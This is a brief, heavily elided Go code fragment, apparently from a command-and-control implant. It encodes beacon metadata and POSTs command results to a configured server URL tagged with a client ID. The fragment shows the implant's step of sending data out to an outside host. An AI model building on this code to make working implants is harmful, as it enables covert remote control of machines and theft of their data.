...
func EncryptedMetaInfo() string {
	...
	finalPakcet := util.NetbiosEncode(packetEncrypted)
	return finalPakcet
}
...
func PushResult(b string) *req.Resp {
	url := config.PostUrl + "?c="+base64.URLEncoding.EncodeToString([]byte(strconv.Itoa(clientID)))
	resp := HttpPost(url, b)
